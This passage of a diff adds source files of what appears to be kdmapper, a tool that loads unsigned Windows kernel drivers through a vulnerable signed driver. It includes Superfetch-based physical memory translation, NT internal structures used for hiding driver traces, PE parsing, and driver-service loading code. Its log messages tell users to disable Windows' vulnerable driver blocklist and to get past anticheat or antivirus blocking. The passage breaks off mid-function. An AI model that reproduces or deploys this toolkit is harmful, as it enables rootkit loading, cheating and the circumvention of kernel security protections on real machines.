+		ULONGLONG Reserved : 7;
+	};
+
+	struct PAGEDIR_INFORMATION {
+		ULONGLONG DontUse : 9;
+		ULONGLONG PageDirectoryBase : 48;
+		ULONGLONG Reserved : 7;
+	};
+
+	struct UNIQUE_PROCESS_INFORMATION {
+		ULONGLONG DontUse : 9;
+		ULONGLONG UniqueProcessKey : 48;
+		ULONGLONG Reserved : 7;
+	};
+
+	struct MMPFN_IDENTITY {
+		union {
+			MEMORY_FRAME_INFORMATION   e1;
+			FILEOFFSET_INFORMATION     e2;
+			PAGEDIR_INFORMATION        e3;
+			UNIQUE_PROCESS_INFORMATION e4;
+		} u1;
+		SIZE_T PageFrameIndex;
+		union {
+			struct {
+				ULONG Image : 1;
+				ULONG Mismatch : 1;
+			} e1;
+			PVOID FileObject;
+			PVOID UniqueFileObjectKey;
+			PVOID ProtoPteAddress;
+			PVOID VirtualAddress;
+		} u2;
+	};
+
+	struct SYSTEM_MEMORY_LIST_INFORMATION {
+		SIZE_T ZeroPageCount;
+		SIZE_T FreePageCount;
+		SIZE_T ModifiedPageCount;
+		SIZE_T ModifiedNoWritePageCount;
+		SIZE_T BadPageCount;
+		SIZE_T PageCountByPriority[8];
+		SIZE_T RepurposedPagesByPriority[8];
+		ULONG_PTR ModifiedPageCountPageFile;
+	};
+
+	struct PF_PFN_PRIO_REQUEST {
+		ULONG Version;
+		ULONG RequestFlags;
+		SIZE_T PfnCount;
+		SYSTEM_MEMORY_LIST_INFORMATION MemInfo;
+		MMPFN_IDENTITY PageData[ANYSIZE_ARRAY];
+	};
+
+	struct PF_PHYSICAL_MEMORY_RANGE {
+		ULONG_PTR BasePfn;
+		ULONG_PTR PageCount;
+	};
+
+	struct PF_MEMORY_RANGE_INFO_V1 {
+		ULONG Version;
+		ULONG RangeCount;
+		PF_PHYSICAL_MEMORY_RANGE Ranges[ANYSIZE_ARRAY];
+	};
+
+	struct PF_MEMORY_RANGE_INFO_V2 {
+		ULONG Version;
+		ULONG Flags;
+		ULONG RangeCount;
+		PF_PHYSICAL_MEMORY_RANGE Ranges[ANYSIZE_ARRAY];
+	};
+
+	constexpr ULONG SE_PROF_SINGLE_PROCESS_PRIVILEGE = 13;
+	constexpr ULONG SE_DEBUG_PRIVILEGE_VAL = 20;
+	constexpr SYSTEM_INFORMATION_CLASS SystemSuperfetchInformation = (SYSTEM_INFORMATION_CLASS)79;
+
+	extern &quot;C&quot; NTSYSAPI NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+
+	struct MemoryRange {
+		uint64_t pfn;
+		size_t page_count;
+	};
+
+	using TranslationMap = std::unordered_map&lt;uint64_t, uint64_t&gt;;
+
+	inline NTSTATUS QuerySuperfetchInfo(
+		SUPERFETCH_INFORMATION_CLASS info_class,
+		PVOID buffer,
+		ULONG length,
+		PULONG return_length = nullptr)
+	{
+		SUPERFETCH_INFORMATION info;
+		info.Version = 45;
+		info.Magic = &#x27;kuhC&#x27;;
+		info.InfoClass = info_class;
+		info.Data = buffer;
+		info.Length = length;
+
+		return NtQuerySystemInformation(SystemSuperfetchInformation,
+			&amp;info, sizeof(info), return_length);
+	}
+
+	inline bool RaisePrivileges() {
+		BOOLEAN old = FALSE;
+		if (!NT_SUCCESS(RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &amp;old)))
+			return false;
+		if (!NT_SUCCESS(RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE_VAL, TRUE, FALSE, &amp;old)))
+			return false;
+		return true;
+	}
+
+	inline std::vector&lt;MemoryRange&gt; QueryMemoryRanges() {
+		std::vector&lt;MemoryRange&gt; ranges;
+		ULONG buffer_length = 0;
+
+		// Try V1
+		PF_MEMORY_RANGE_INFO_V1 info_v1;
+		memset(&amp;info_v1, 0, sizeof(info_v1));
+		info_v1.Version = 1;
+		NTSTATUS st = QuerySuperfetchInfo(SuperfetchMemoryRangesQuery, &amp;info_v1, sizeof(info_v1), &amp;buffer_length);
+
+		if (st == (NTSTATUS)0xC0000023 &amp;&amp; buffer_length &gt; 0) {
+			auto buffer = std::make_unique&lt;uint8_t[]&gt;(buffer_length);
+			auto info = reinterpret_cast&lt;PF_MEMORY_RANGE_INFO_V1*&gt;(buffer.get());
+			info-&gt;Version = 1;
+			if (NT_SUCCESS(QuerySuperfetchInfo(SuperfetchMemoryRangesQuery, info, buffer_length))) {
+				for (uint32_t i = 0; i &lt; info-&gt;RangeCount; ++i) {
+					MemoryRange r;
+					r.pfn = info-&gt;Ranges[i].BasePfn;
+					r.page_count = info-&gt;Ranges[i].PageCount;
+					ranges.push_back(r);
+				}
+				return ranges;
+			}
+		}
+
+		// Try V2
+		PF_MEMORY_RANGE_INFO_V2 info_v2;
+		memset(&amp;info_v2, 0, sizeof(info_v2));
+		info_v2.Version = 2;
+		buffer_length = 0;
+		st = QuerySuperfetchInfo(SuperfetchMemoryRangesQuery, &amp;info_v2, sizeof(info_v2), &amp;buffer_length);
+
+		if (st == (NTSTATUS)0xC0000023 &amp;&amp; buffer_length &gt; 0) {
+			auto buffer = std::make_unique&lt;uint8_t[]&gt;(buffer_length);
+			auto info = reinterpret_cast&lt;PF_MEMORY_RANGE_INFO_V2*&gt;(buffer.get());
+			info-&gt;Version = 2;
+			if (NT_SUCCESS(QuerySuperfetchInfo(SuperfetchMemoryRangesQuery, info, buffer_length))) {
+				for (uint32_t i = 0; i &lt; info-&gt;RangeCount; ++i) {
+					MemoryRange r;
+					r.pfn = info-&gt;Ranges[i].BasePfn;
+					r.page_count = info-&gt;Ranges[i].PageCount;
+					ranges.push_back(r);
+				}
+			}
+		}
+
+		return ranges;
+	}
+
+	// Build a VA-&gt;PA translation map using Superfetch PFN queries.
+	// Returns map of (page-aligned VA) -&gt; (PA)
+	inline TranslationMap BuildTranslationMap() {
+		TranslationMap map;
+
+		if (!RaisePrivileges())
+			return map;
+
+		auto ranges = QueryMemoryRanges();
+		if (ranges.empty())
+			return map;
+
+		for (const auto&amp; range : ranges) {
+			size_t buf_len = sizeof(PF_PFN_PRIO_REQUEST) + sizeof(MMPFN_IDENTITY) * range.page_count;
+			auto buffer = std::make_unique&lt;uint8_t[]&gt;(buf_len);
+			auto request = reinterpret_cast&lt;PF_PFN_PRIO_REQUEST*&gt;(buffer.get());
+			request-&gt;Version = 1;
+			request-&gt;RequestFlags = 1;
+			request-&gt;PfnCount = range.page_count;
+
+			for (uint64_t i = 0; i &lt; range.page_count; ++i)
+				request-&gt;PageData[i].PageFrameIndex = range.pfn + i;
+
+			if (!NT_SUCCESS(QuerySuperfetchInfo(SuperfetchPfnQuery, request, (ULONG)buf_len)))
+				continue;
+
+			for (uint64_t i = 0; i &lt; range.page_count; ++i) {
+				void* virt = request-&gt;PageData[i].u2.VirtualAddress;
+				if (virt) {
+					uint64_t va_page = reinterpret_cast&lt;uint64_t&gt;(virt) &amp; ~0xFFFull;
+					uint64_t pa = (range.pfn + i) &lt;&lt; 12;
+					map[va_page] = pa;
+				}
+			}
+		}
+
+		return map;
+	}
+
+	// Translate a single VA to PA using a pre-built map
+	inline uint64_t Translate(const TranslationMap&amp; map, uint64_t va) {
+		uint64_t va_page = va &amp; ~0xFFFull;
+		auto it = map.find(va_page);
+		if (it == map.end())
+			return 0;
+		return it-&gt;second + (va &amp; 0xFFF);
+	}
+
+} // namespace superfetch
+</code></pre>
+<h3>include/nt.hpp</h3>
+<pre><code>﻿#pragma once
+#include &lt;Windows.h&gt;
+#include &lt;winternl.h&gt;
+#pragma comment(lib, &quot;ntdll.lib&quot;)
+
+#pragma warning(push)
+#pragma warning(disable: 4005) //macro redefinition
+#include &lt;ntstatus.h&gt;
+#pragma warning(pop)
+
+namespace nt
+{
+	constexpr auto SystemModuleInformation = 11;
+	constexpr auto SystemExtendedHandleInformation = 64;
+
+	extern &quot;C&quot; NTSTATUS NtLoadDriver(PUNICODE_STRING DriverServiceName);
+	extern &quot;C&quot; NTSTATUS NtUnloadDriver(PUNICODE_STRING DriverServiceName);
+	extern &quot;C&quot; NTSTATUS RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN Client, BOOLEAN* WasEnabled);
+
+
+	typedef struct _SYSTEM_HANDLE
+	{
+		PVOID Object;
+		HANDLE UniqueProcessId;
+		HANDLE HandleValue;
+		ULONG GrantedAccess;
+		USHORT CreatorBackTraceIndex;
+		USHORT ObjectTypeIndex;
+		ULONG HandleAttributes;
+		ULONG Reserved;
+	} SYSTEM_HANDLE, *PSYSTEM_HANDLE;
+
+	typedef struct _SYSTEM_HANDLE_INFORMATION_EX
+	{
+		ULONG_PTR HandleCount;
+		ULONG_PTR Reserved;
+		SYSTEM_HANDLE Handles[1];
+	} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;
+
+	//Thanks to Pvt Comfy for remember to update this https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type
+	typedef enum class _POOL_TYPE {
+		NonPagedPool,
+		NonPagedPoolExecute = NonPagedPool,
+		PagedPool,
+		NonPagedPoolMustSucceed = NonPagedPool + 2,
+		DontUseThisType,
+		NonPagedPoolCacheAligned = NonPagedPool + 4,
+		PagedPoolCacheAligned,
+		NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
+		MaxPoolType,
+		NonPagedPoolBase = 0,
+		NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
+		NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
+		NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,
+		NonPagedPoolSession = 32,
+		PagedPoolSession = NonPagedPoolSession + 1,
+		NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
+		DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
+		NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
+		PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
+		NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
+		NonPagedPoolNx = 512,
+		NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
+		NonPagedPoolSessionNx = NonPagedPoolNx + 32,
+	} POOL_TYPE;
+
+	typedef struct _RTL_PROCESS_MODULE_INFORMATION
+	{
+		HANDLE Section;
+		PVOID MappedBase;
+		PVOID ImageBase;
+		ULONG ImageSize;
+		ULONG Flags;
+		USHORT LoadOrderIndex;
+		USHORT InitOrderIndex;
+		USHORT LoadCount;
+		USHORT OffsetToFileName;
+		UCHAR FullPathName[256];
+	} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;
+
+	typedef struct _RTL_PROCESS_MODULES
+	{
+		ULONG NumberOfModules;
+		RTL_PROCESS_MODULE_INFORMATION Modules[1];
+	} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
+
+	typedef struct _HashBucketEntry
+	{
+		struct _HashBucketEntry* Next;
+		UNICODE_STRING DriverName;
+		ULONG CertHash[5];
+	} HashBucketEntry, * PHashBucketEntry;
+
+
+	typedef struct _RTL_BALANCED_LINKS {
+		struct _RTL_BALANCED_LINKS* Parent;
+		struct _RTL_BALANCED_LINKS* LeftChild;
+		struct _RTL_BALANCED_LINKS* RightChild;
+		CHAR Balance;
+		UCHAR Reserved[3];
+	} RTL_BALANCED_LINKS;
+	typedef RTL_BALANCED_LINKS* PRTL_BALANCED_LINKS;
+
+	typedef struct _RTL_AVL_TABLE {
+		RTL_BALANCED_LINKS BalancedRoot;
+		PVOID OrderedPointer;
+		ULONG WhichOrderedElement;
+		ULONG NumberGenericTableElements;
+		ULONG DepthOfTree;
+		PVOID RestartKey;
+		ULONG DeleteCount;
+		PVOID CompareRoutine;
+		PVOID AllocateRoutine;
+		PVOID FreeRoutine;
+		PVOID TableContext;
+	} RTL_AVL_TABLE;
+	typedef RTL_AVL_TABLE* PRTL_AVL_TABLE;
+
+	typedef struct _PiDDBCacheEntry
+	{
+		LIST_ENTRY		List;
+		UNICODE_STRING	DriverName;
+		ULONG			TimeDateStamp;
+		NTSTATUS		LoadStatus;
+		char			_0x0028[16]; // data from the shim engine, or uninitialized memory for custom drivers
+	} PiDDBCacheEntry, * NPiDDBCacheEntry;
+}
+</code></pre>
+<h3>include/portable_executable.hpp</h3>
+<pre><code>#pragma once
+#include &lt;Windows.h&gt;
+#include &lt;vector&gt;
+#include &lt;string&gt;
+
+namespace portable_executable
+{
+	struct RelocInfo
+	{
+		ULONG64 address;
+		USHORT* item;
+		ULONG32 count;
+	};
+
+	struct ImportFunctionInfo
+	{
+		std::string name;
+		ULONG64* address;
+	};
+
+	struct ImportInfo
+	{
+		std::string module_name;
+		std::vector&lt;ImportFunctionInfo&gt; function_datas;
+	};
+
+	using vec_sections = std::vector&lt;IMAGE_SECTION_HEADER&gt;;
+	using vec_relocs = std::vector&lt;RelocInfo&gt;;
+	using vec_imports = std::vector&lt;ImportInfo&gt;;
+
+	PIMAGE_NT_HEADERS64 GetNtHeaders(void* image_base);
+	vec_relocs GetRelocs(void* image_base);
+	vec_imports GetImports(void* image_base);
+}</code></pre>
+<h3>portable_executable.cpp</h3>
+<pre><code>#include &quot;portable_executable.hpp&quot;
+
+#include &lt;Windows.h&gt;
+#include &lt;string&gt;
+
+
+PIMAGE_NT_HEADERS64 portable_executable::GetNtHeaders(void* image_base) {
+	const auto dos_header = reinterpret_cast&lt;PIMAGE_DOS_HEADER&gt;(image_base);
+
+	if (dos_header-&gt;e_magic != IMAGE_DOS_SIGNATURE)
+		return nullptr;
+
+	const auto nt_headers = reinterpret_cast&lt;PIMAGE_NT_HEADERS64&gt;(reinterpret_cast&lt;ULONG64&gt;(image_base) + dos_header-&gt;e_lfanew);
+
+	if (nt_headers-&gt;Signature != IMAGE_NT_SIGNATURE)
+		return nullptr;
+
+	return nt_headers;
+}
+
+portable_executable::vec_relocs portable_executable::GetRelocs(void* image_base) {
+	const PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);
+
+	if (!nt_headers)
+		return {};
+
+	vec_relocs relocs;
+	DWORD reloc_va = nt_headers-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
+
+	if (!reloc_va) //Fix from @greetmark of UnknownCheats Forum
+		return {};
+
+	auto current_base_relocation = reinterpret_cast&lt;PIMAGE_BASE_RELOCATION&gt;(reinterpret_cast&lt;ULONG64&gt;(image_base) + reloc_va);
+	const auto reloc_end = reinterpret_cast&lt;PIMAGE_BASE_RELOCATION&gt;(reinterpret_cast&lt;ULONG64&gt;(current_base_relocation) + nt_headers-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
+
+	while (current_base_relocation &lt; reloc_end &amp;&amp; current_base_relocation-&gt;SizeOfBlock) {
+		RelocInfo reloc_info;
+
+		reloc_info.address = reinterpret_cast&lt;ULONG64&gt;(image_base) + current_base_relocation-&gt;VirtualAddress;
+		reloc_info.item = reinterpret_cast&lt;USHORT*&gt;(reinterpret_cast&lt;ULONG64&gt;(current_base_relocation) + sizeof(IMAGE_BASE_RELOCATION));
+		reloc_info.count = (current_base_relocation-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
+
+		relocs.push_back(reloc_info);
+
+		current_base_relocation = reinterpret_cast&lt;PIMAGE_BASE_RELOCATION&gt;(reinterpret_cast&lt;ULONG64&gt;(current_base_relocation) + current_base_relocation-&gt;SizeOfBlock);
+	}
+
+	return relocs;
+}
+
+portable_executable::vec_imports portable_executable::GetImports(void* image_base) {
+	const PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);
+
+	if (!nt_headers)
+		return {};
+
+	DWORD import_va = nt_headers-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+
+	//not imports necesary
+	if (!import_va)
+		return {};
+
+	vec_imports imports;
+
+	auto current_import_descriptor = reinterpret_cast&lt;PIMAGE_IMPORT_DESCRIPTOR&gt;(reinterpret_cast&lt;ULONG64&gt;(image_base) + import_va);
+
+	while (current_import_descriptor-&gt;FirstThunk) {
+		ImportInfo import_info;
+
+		import_info.module_name = std::string(reinterpret_cast&lt;char*&gt;(reinterpret_cast&lt;ULONG64&gt;(image_base) + current_import_descriptor-&gt;Name));
+
+		auto current_first_thunk = reinterpret_cast&lt;PIMAGE_THUNK_DATA64&gt;(reinterpret_cast&lt;ULONG64&gt;(image_base) + current_import_descriptor-&gt;FirstThunk);
+		auto current_originalFirstThunk = reinterpret_cast&lt;PIMAGE_THUNK_DATA64&gt;(reinterpret_cast&lt;ULONG64&gt;(image_base) + current_import_descriptor-&gt;OriginalFirstThunk);
+
+		while (current_originalFirstThunk-&gt;u1.Function) {
+			ImportFunctionInfo import_function_data;
+
+			auto thunk_data = reinterpret_cast&lt;PIMAGE_IMPORT_BY_NAME&gt;(reinterpret_cast&lt;ULONG64&gt;(image_base) + current_originalFirstThunk-&gt;u1.AddressOfData);
+
+			import_function_data.name = thunk_data-&gt;Name;
+			import_function_data.address = &amp;current_first_thunk-&gt;u1.Function;
+
+			import_info.function_datas.push_back(import_function_data);
+
+			++current_originalFirstThunk;
+			++current_first_thunk;
+		}
+
+		imports.push_back(import_info);
+		++current_import_descriptor;
+	}
+
+	return imports;
+}</code></pre>
+<h3>include/service.hpp</h3>
+<pre><code>#pragma once
+#include &lt;string&gt;
+#include &quot;nt.hpp&quot;
+
+namespace service
+{
+	NTSTATUS RegisterAndStart(const std::wstring&amp; driver_path, const std::wstring&amp; serviceName);
+	NTSTATUS StopAndRemove(const std::wstring&amp; serviceName);
+};</code></pre>
+<h3>service.cpp</h3>
+<pre><code>#include &quot;service.hpp&quot;
+#include &lt;Windows.h&gt;
+#include &lt;string&gt;
+#include &lt;iostream&gt;
+
+#include &quot;utils.hpp&quot;
+#include &quot;nt.hpp&quot;
+
+NTSTATUS service::RegisterAndStart(const std::wstring&amp; driver_path, const std::wstring&amp; serviceName) {
+	const static DWORD ServiceTypeKernel = 1;
+	const std::wstring servicesPath = L&quot;SYSTEM\\CurrentControlSet\\Services\\&quot; + serviceName;
+	const std::wstring nPath = L&quot;\\??\\&quot; + driver_path;
+
+	HKEY dservice;
+	LSTATUS status = RegCreateKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &amp;dservice); //Returns Ok if already exists
+	if (status != ERROR_SUCCESS) {
+		kdmLog(&quot;[-] Can&#x27;t create service key&quot; &lt;&lt; std::endl);
+		return STATUS_REGISTRY_IO_FAILED;
+	}
+
+	status = RegSetKeyValueW(dservice, NULL, L&quot;ImagePath&quot;, REG_EXPAND_SZ, nPath.c_str(), (DWORD)(nPath.size()*sizeof(wchar_t)));
+	if (status != ERROR_SUCCESS) {
+		RegCloseKey(dservice);
+		RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
+		kdmLog(&quot;[-] Can&#x27;t create &#x27;ImagePath&#x27; registry value&quot; &lt;&lt; std::endl);
+		return STATUS_REGISTRY_IO_FAILED;
+	}
+	
+	status = RegSetKeyValueW(dservice, NULL, L&quot;Type&quot;, REG_DWORD, &amp;ServiceTypeKernel, sizeof(DWORD));
+	if (status != ERROR_SUCCESS) {
+		RegCloseKey(dservice);
+		RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
+		kdmLog(&quot;[-] Can&#x27;t create &#x27;Type&#x27; registry value&quot; &lt;&lt; std::endl);
+		return STATUS_REGISTRY_IO_FAILED;
+	}
+	
+	RegCloseKey(dservice);
+
+	HMODULE ntdll = GetModuleHandleA(&quot;ntdll.dll&quot;);
+	if (ntdll == NULL) {
+		RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
+		return STATUS_UNSUCCESSFUL;
+	}
+
+	//auto RtlAdjustPrivilege = (nt::RtlAdjustPrivilege)GetProcAddress(ntdll, &quot;RtlAdjustPrivilege&quot;);
+	//auto NtLoadDriver = (nt::NtLoadDriver)GetProcAddress(ntdll, &quot;NtLoadDriver&quot;);
+
+	ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
+	BOOLEAN SeLoadDriverWasEnabled;
+	NTSTATUS ntStatus = nt::RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &amp;SeLoadDriverWasEnabled);
+	if (!NT_SUCCESS(ntStatus)) {
+		RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
+		kdmLog(&quot;Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.&quot; &lt;&lt; std::endl);
+		return ntStatus;
+	}
+
+	std::wstring wdriver_reg_path = L&quot;\\Registry\\Machine\\System\\CurrentControlSet\\Services\\&quot; + serviceName;
+	UNICODE_STRING serviceStr;
+	RtlInitUnicodeString(&amp;serviceStr, wdriver_reg_path.c_str());
+
+	ntStatus = nt::NtLoadDriver(&amp;serviceStr);
+
+	kdmLog(&quot;[+] NtLoadDriver Status 0x&quot; &lt;&lt; std::hex &lt;&lt; ntStatus &lt;&lt; std::endl);
+
+	if (ntStatus == STATUS_IMAGE_CERT_REVOKED) {
+		kdmLog(&quot;[-] Your vulnerable driver list is enabled and have blocked the driver loading, you must disable vulnerable driver list to use kdmapper with intel driver&quot; &lt;&lt; std::endl);
+		kdmLog(&quot;[-] Registry path to disable vulnerable driver list: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config&quot; &lt;&lt; std::endl);
+		kdmLog(&quot;[-] Set &#x27;VulnerableDriverBlocklistEnable&#x27; as dword to 0&quot; &lt;&lt; std::endl);
+	}
+	else if (ntStatus == STATUS_ACCESS_DENIED || ntStatus == STATUS_INSUFFICIENT_RESOURCES) {
+		kdmLog(&quot;[-] Access Denied or Insufficient Resources (0x&quot; &lt;&lt; std::hex &lt;&lt; ntStatus &lt;&lt; &quot;), Probably some anticheat or antivirus running blocking the load of vulnerable driver&quot; &lt;&lt; std::endl);
+	}
+	
+	if (!NT_SUCCESS(ntStatus)) {
+		//Remove the service
+		status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
+		if (status != ERROR_SUCCESS) {
+			kdmLog(&quot;[-] Can&#x27;t delete service registry key after NtLoadDriver failure&quot; &lt;&lt; std::endl);
+		}
+	}
+
+	return ntStatus;
+}
+
+NTSTATUS service::StopAndRemove(const std::wstring&amp; serviceName) {
+	HMODULE ntdll = GetModuleHandleA(&quot;ntdll.dll&quot;);
+	if (ntdll == NULL)
+		return STATUS_UNSUCCESSFUL;
+
+	std::wstring wdriver_reg_path = L&quot;\\Registry\\Machine\\System\\CurrentControlSet\\Services\\&quot; + serviceName;
+	UNICODE_STRING serviceStr;
+	RtlInitUnicodeString(&amp;serviceStr, wdriver_reg_path.c_str());
+
+	HKEY driver_service;
+	std::wstring servicesPath = L&quot;SYSTEM\\CurrentControlSet\\Services\\&quot; + serviceName;
+	LSTATUS status = RegOpenKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &amp;driver_service);
+	if (status != ERROR_SUCCESS) {
+		if (status == ERROR_FILE_NOT_FOUND) {
+			return STATUS_SUCCESS; //already removed
+		}
+		return STATUS_REGISTRY_IO_FAILED;
+	}
+	RegCloseKey(driver_service);
+
+	NTSTATUS st = nt::NtUnloadDriver(&amp;serviceStr);
+	kdmLog(&quot;[+] NtUnloadDriver Status 0x&quot; &lt;&lt; std::hex &lt;&lt; st &lt;&lt; std::endl);
+	if (st != ERROR_SUCCESS) {
+		kdmLog(&quot;[-] Driver Unload Failed!!&quot; &lt;&lt; std::endl);
+		status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
+		return st; //lets consider unload fail as error because can cause problems with anti cheats later
+	}
+
+	status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());
+	if (status != ERROR_SUCCESS) {
+		return STATUS_REGISTRY_IO_FAILED;
+	}
+	return st;
+}
+</code></pre>
+<h3>include/utils.hpp</h3>
+<pre><code>#pragma once
+
+#include &lt;Windows.h&gt;
+#include &lt;string&gt;
+#include &lt;vector&gt;
+#include &lt;iostream&gt;
+
+#if defined(DISABLE_OUTPUT)
+#define kdmLog(content) 
+#else
+#define kdmLog(content) std::wcout &lt;&lt; content
+#endif
+
+namespace kdmUtils
+{
+	std::wstring GetFullTempPath();
+	bool ReadFileToMemory(const std::wstring&amp; file_path, std::vector&lt;BYTE&gt;* out_buffer);
+	bool CreateFileFromMemory(const std::wstring&amp; desired_file_path, const char* address, size_t size);
+	uint64_t GetKernelModuleAddress(const std::string&amp; module_name);
+	BOOLEAN bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask);
+	uintptr_t FindPattern(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
+	PVOID FindSection(const char* sectionName, uintptr_t modulePtr, PULONG size);
+	std::wstring GetCurrentAppFolder();
+}</code></pre>
+<h3>utils.cpp</h3>
+<pre><code>#include &quot;utils.hpp&quot;
+#include &lt;Windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;vector&gt;
+#include &lt;fstream&gt;
+
+#include &quot;nt.hpp&quot;
+
+std::wstring kdmUtils::GetFullTempPath() {
+	wchar_t temp_directory[MAX_PATH + 1] = { 0 };
+	const uint32_t get_temp_path_ret = GetTempPathW(sizeof(temp_directory) / 2, temp_directory);
+	if (!get_temp_path_ret || get_temp_path_ret &gt; MAX_PATH + 1) {
+		kdmLog(L&quot;[-] Failed to get temp path&quot; &lt;&lt; std::endl);
+		return L&quot;&quot;;
+	}
+	if (temp_directory[wcslen(temp_directory) - 1] == L&#x27;\\&#x27;)
+		temp_directory[wcslen(temp_directory) - 1] = 0x0;
+
+	return std::wstring(temp_directory);
+}
+
+bool kdmUtils::ReadFileToMemory(const std::wstring&amp; file_path, std::vector&lt;BYTE&gt;* out_buffer) {
+	std::ifstream file_ifstream(file_path, std::ios::binary);
+
+	if (!file_ifstream)
+		return false;
+
+	out_buffer-&gt;assign((std::istreambuf_iterator&lt;char&gt;(file_ifstream)), std::istreambuf_iterator&lt;char&gt;());
+	file_ifstream.close();
+
+	return true;
+}
+
+bool kdmUtils::CreateFileFromMemory(const std::wstring&amp; desired_file_path, const char* address, size_t size) {
+	std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);
+
+	if (!file_ofstream.write(address, size)) {
+		file_ofstream.close();
+		return false;
+	}
+
+	file_ofstream.close();
+	return true;
+}
+
+uint64_t kdmUtils::GetKernelModuleAddress(const std::string&amp; module_name) {
+	void* buffer = nullptr;
+	DWORD buffer_size = 0;
+
+	NTSTATUS status = NtQuerySystemInformation(static_cast&lt;SYSTEM_INFORMATION_CLASS&gt;(nt::SystemModuleInformation), buffer, buffer_size, &amp;buffer_size);
+
+	while (status == STATUS_INFO_LENGTH_MISMATCH) {
+		if (buffer != nullptr)
+			VirtualFree(buffer, 0, MEM_RELEASE);
+
+		buffer = VirtualAlloc(nullptr, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		status = NtQuerySystemInformation(static_cast&lt;SYSTEM_INFORMATION_CLASS&gt;(nt::SystemModuleInformation), buffer, buffer_size, &amp;buffer_size);
+	}
+
+	if (!NT_SUCCESS(status)) {
+		if (buffer != nullptr)
+			VirtualFree(buffer, 0, MEM_RELEASE);
+		return 0;
+	}
+
+	const auto modules = static_cast&lt;nt::PRTL_PROCESS_MODULES&gt;(buffer);
+	if (!modules)
+		return 0;
+
+	for (auto i = 0u; i &lt; modules-&gt;NumberOfModules; ++i) {
+		const std::string current_module_name = std::string(reinterpret_cast&lt;char*&gt;(modules-&gt;Modules[i].FullPathName) + modules-&gt;Modules[i].OffsetToFileName);
+
+		if (!_stricmp(current_module_name.c_str(), module_name.c_str()))
+		{
+			const uint64_t result = reinterpret_cast&lt;uint64_t&gt;(modules-&gt;Modules[i].ImageBase);
+
+			VirtualFree(buffer, 0, MEM_RELEASE);
+			return result;
+		}
+	}
+
+	VirtualFree(buffer, 0, MEM_RELEASE);
+	return 0;
+}
+
+BOOLEAN kdmUtils::bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask) {
+	for (; *szMask; ++szMask, ++pData, ++bMask)
+		if (*szMask == &#x27;x&#x27; &amp;&amp; *pData != *bMask)
+			return 0;
+	return (*szMask) == 0;
+}
+
+uintptr_t kdmUtils::FindPattern(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
+	size_t max_len = dwLen - strlen(szMask);
+	for (uintptr_t i = 0; i &lt; max_len; i++)
+		if (bDataCompare((BYTE*)(dwAddress + i), bMask, szMask))
+			return (uintptr_t)(dwAddress + i);
+	return 0;
+}
+
+PVOID kdmUtils::FindSection(const char* sectionName, uintptr_t modulePtr, PULONG size) {
+	size_t namelength = strlen(sectionName);
+	PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)(modulePtr + ((PIMAGE_DOS_HEADER)modulePtr)-&gt;e_lfanew);
+	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(headers);
+	for (DWORD i = 0; i &lt; headers-&gt;FileHeader.NumberOfSections; ++i) {
+		PIMAGE_SECTION_HEADER section = &amp;sections[i];
+		if (memcmp(section-&gt;Name, sectionName, namelength) == 0 &amp;&amp;
+			namelength == strlen((char*)section-&gt;Name)) {
+			if (!section-&gt;VirtualAddress) {
+				return 0;
+			}
+			if (size) {
+				*size = section-&gt;Misc.VirtualSize;
+			}
+			return (PVOID)(modulePtr + section-&gt;VirtualAddress);
